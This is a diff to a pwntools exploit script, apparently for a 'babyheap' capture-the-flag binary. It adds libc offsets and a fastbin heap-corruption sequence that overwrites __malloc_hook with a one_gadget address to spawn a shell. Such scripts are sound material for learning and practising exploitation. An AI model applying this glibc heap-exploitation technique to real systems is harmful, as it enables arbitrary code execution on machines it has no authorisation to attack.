@@ -16,10 +16,14 @@ if sys.argv[1] == "l":
     io = process("./babyheap")
     libc = elf.libc
     main_arena = 0x399b00
+    one_gadget = 0x3f2d6
+    one_gadget = 0x3f32a
 
 else:
     io = remote("localhost", 9999)
     libc = ELF("./libc-2.23.so")
+    main_arena = 0x3c4b20
+    one_gadget = 0x4526a
 
 success = lambda name, value: log.success("{} -> {:#x}".format(name, value))
 
@@ -109,13 +113,26 @@ if __name__ == "__main__":
     libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - 88 - main_arena
     success("libc.address", libc.address)
     pause()
-    
+
+    New('a' * 0x60)
+    New('b' * 0x60)
+    New('c' * 0x60)
     #  DEBUG([0xCFF, 0xEF2], True)
-    New('4' * 0x70)
-    New('5' * 0x70)
     Delete(5)
 
-    Edit(4, '4' * 0x70 + p64(0) + p64(0x81) + p64(libc.address + libc.sym['__malloc_hook'] - 0x18 + 5))
+    #  DEBUG([0xDE5], True)
+    Edit(3, 'd' * 0x10 + p64(0) + p64(0x71) + p64(libc.sym['__malloc_hook'] - 0x28 + 5))
+    #  DEBUG([0xCFF], True)
+    New('e' * 0x60)
+    #  DEBUG([0xC73], True)
+    #  DEBUG([0xCFF], True)
+    #  New('00000000111111112222222233333333444444445555555566666666'.ljust(0x60, '0'))
+    payload = p8(0) * 19 + p64(libc.address + one_gadget)
+    New(payload.ljust(0x60, '0'))
+
+
+    #  DEBUG([0xC73], True)
+    New('getshell')
 
     io.interactive()
     io.close()
